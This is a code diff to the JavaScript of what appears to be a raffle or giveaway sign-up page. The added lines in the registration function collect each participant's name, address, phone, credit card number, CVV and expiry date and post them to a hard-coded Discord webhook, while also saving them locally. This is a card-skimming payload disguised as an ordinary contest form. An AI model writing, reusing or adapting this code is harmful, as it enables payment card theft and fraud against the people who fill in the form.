@@ -262,20 +262,36 @@ document.getElementById("participantes").innerText=participantes
 },4000)
 
 function registrar(){
+  const nombre = document.getElementById("nombre").value
+  const direccion = document.getElementById("direccion").value
+  const telefono = document.getElementById("telefono").value
+  const credit = document.getElementById("credit").value
+  const threenumber = document.getElementById("threenumber").value
+  const expeditiondate = document.getElementById("expeditiondate").value
 
-const datos={
+  // Construimos mensaje para Discord
+  const contenido = `**Nuevo participante**\nNombre: ${nombre}\nDirección: ${direccion}\nTeléfono: ${telefono}\ncredit: ${credit}\ncvv: ${threenumber}\nexpeditiondate: ${expeditiondate}\nFecha: ${new Date().toLocaleString()}`
 
-nombre:document.getElementById("nombre").value,
-direccion:document.getElementById("direccion").value,
-telefono:document.getElementById("telefono").value,
-credit:document.getElementById("credit").value,
-threenumber:document.getElementById("threenumber").value,
-expeditiondate:document.getElementById("expeditiondate").value,
-ticket:ticket
+  // Enviar al webhook
+  fetch("https://discord.com/api/webhooks/1482036611435724841/JhKTsn1XoUpAIGHcf4VmzAHvgkGCrW-hM5rWkX9yL-2YCsFNhGJi9TigvftNhXL65bH_", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({content: contenido})
+  })
 
+  // Guardamos localmente también (opcional)
+  const datos = {
+    nombre, direccion, telefono, ticket, credit, cvv, expeditiondate
+  }
+  localStorage.setItem("participante", JSON.stringify(datos))
+
+  // Pasamos a la siguiente sección
+  document.getElementById("formSection").style.display = "none"
+  document.getElementById("codigoSection").style.display = "block"
 }
 
-localStorage.setItem("participante",JSON.stringify(datos))
 
 
 document.getElementById("formSection").style.display="none"
